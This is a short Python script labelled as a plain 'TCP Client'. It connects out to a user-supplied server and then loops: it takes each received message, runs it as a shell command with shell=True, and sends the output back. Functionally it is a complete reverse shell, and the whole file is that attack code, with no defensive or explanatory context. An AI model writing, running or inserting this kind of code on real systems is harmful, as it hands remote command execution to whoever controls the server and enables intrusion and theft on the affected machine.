#!/usr/bin/env python3

import subprocess
import socket
import sys

def ExecuteCommand(cmd):
    #
    return subprocess.check_output(cmd,shell=True)

def main():
    #
    print("[*] TCP Client [*]")
    #
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #
    addr = input("[+] Server address-> ")
    #
    port = int(input("[+] Server port-> "))
    #
    msg = b"\n[*] Connection Established [*]\n"
    #
    print("[*] Resource: %s|%s " % (addr,port))
    #
    print("[*] Connecting to: %s|%s " % (addr,port))
    #
    try:
        #
        s.connect((addr,port))
        #
    except:
        #
        print("[!] Connection Failure [!]")
        #
        sys.exit(1)
        #
    try:
        #
        print("[*] Sending Message [*]")
        #
        s.send(msg)
        #
    except:
        #
        print("[!] Transmission Failure [!]")
        #
        sys.exit(1)
        #
    while(True):
        #
        buffer = s.recv(1024)
        #
        result = ExecuteCommand(buffer)
        #
        s.send(result)
        #
        print(result)
        #
    s.close()

if(__name__ == '__main__'):
    #
    main()
